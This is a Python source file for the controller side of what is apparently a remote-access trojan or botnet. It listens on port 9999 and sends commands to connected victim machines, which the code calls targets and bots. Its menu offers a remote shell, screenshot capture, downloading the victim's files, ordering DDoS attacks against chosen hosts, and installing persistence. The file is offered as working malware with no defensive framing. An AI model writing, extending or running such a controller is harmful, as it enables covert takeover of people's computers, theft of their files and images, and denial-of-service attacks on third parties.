import socket
import time
import os
import datetime
from random import randint


# create socket
def socket_create():
	try:
		global host
		global port
		global s
		host = ''
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("Socket creation error: " + str(msg))
# bind socket to port and wait for connection 


def socket_bind():
	try:
		global host
		global port
		global s
		print("Bindding socket to port: " + str(port))
		s.bind((host,port))
		s.listen(5)
	except socket.error as msg:
		print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
		socket_bind()


# Establish a connection with client(socket must be listening)
def socket_accept():
	conn, address = s.accept()
	print("Connection has been established | " + "IP: " + address[0] + " | PORT: " +str(address[1]))
	send_commands(conn)
	conn.close()


def send_commands(conn):
	function = ['shell','help','ddos','download','print','upload','clear','quit','exit','reset']
	while True:
		cmd = input(':')
		if cmd == 'quit':
			conn.send(str.encode(cmd))
			conn.close()
		if cmd == 'help':
			print("commands\
					\nshell: Open a shell to send commands to the target\
					\nprint: Take a screenshot of the target\
					\ndownload: Download some file of the target Example: '/path/to/the/file/file.txt'\
					\nddos: Make a DDos using the target or all targets!\
					\n\nControl:\
					\nquit: turn off server but target still on!\
					\nexit: close shell but target still on!\
					\nclose: close the target process(turn off the bot)\
					\nhelp: show that message!")
		if cmd == 'clear':
			os.system("cls")
		if cmd == 'print':
			conn.send(str.encode(cmd))
			prints(conn)
		if cmd == 'download':
					conn.send(str.encode('download'))
					filename = input("Filename: ")		
					conn.send(str.encode(filename))
					download(conn,filename) 
		if cmd == 'ddos':
			conn.send(str.encode('ddos'))
			target = input("Target: ")
			conn.send(str.encode(target))
			port = input("Port: ")
			conn.send(str.encode(port))		
		if cmd == 'reset':
			conn.send(str.encode('quit'))
			conn.close()
			main()
		if cmd == 'persistence':
			conn.send(str.encode(cmd))
			while True:
				response = input("Install[Y]\ttDisable[D]\tExit[Q]\n: ")
				if response == 'Y' or response == 'y':
					conn.send(str.encode('install'))
					os.system("cls")
					print("Rebooting server for restet the filter...")
					print("Persistence [ON]")
					conn.close()
					main()
					break
				elif response == 'D' or response == 'd':
					conn.send(str.encode('remove'))
					os.system("cls")
					print("Rebooting server for restet the filter...")
					print("Persistence [OFF]")
					conn.close()
					main()
					break
				elif response == 'Q' or response == 'q':
					break
				else:
					print("Choose the right!")
		if len(cmd) > 0:
			conn.send(str.encode(cmd))
			client_response = conn.recv(1024)
			print(client_response.decode('utf-8',"ignore"))
		if cmd == 'exit':
					conn.send(str.encode('exit')) 
					print("\n\n")
		if cmd == "close":
			conn.send(str.encode("closer"))
			time.sleep(0.5)
			conn.send(str.encode("close"))

		
def prints(conn):
	i = datetime.datetime.now()
	f = open('screenshot_' + str(i.day ) + str(i.month) + str(i.year) + str(i.hour) + str(i.month) + str(i.second) + '.png', 'wb')
	data = conn.recv(1000000)
	f.write(data)
	f.close()
	conn.close()
	os.system("cls")
	print("if image dont work, reboot your server!")
	main()
	send_commands(conn)


def download(conn,filename):
	data = conn.recv(1024)
	resposta = data.decode("utf-8")
	if resposta.find("EXISTS") != -1:
		filesize = int(data[6:])
		print("work better with .txt and other kind of text files!\n but work for other formats too!")
		message = input("Do yo want to download " + str(filesize) + "Bytes ? [Y/N]: " )
		if message == "Y":
			conn.send(str.encode('OK'))
			f = open(os.path.join(filename)+"_new", 'w')
			data = conn.recv(1024)
			totalRecv = len(data)
			dados = data.decode("utf-8")
			print("Writing data...")
			f.write(dados)
			while totalRecv < filesize:
				data = conn.recv(1024)
				totalRecv += len(data)
				f.write(data)
			f.close()
			print("Download complete!")
	else:
		print("File no exist!")
	send_commands(conn)
		
					
def main():
	socket_create()
	socket_bind()
	socket_accept()
main()
		
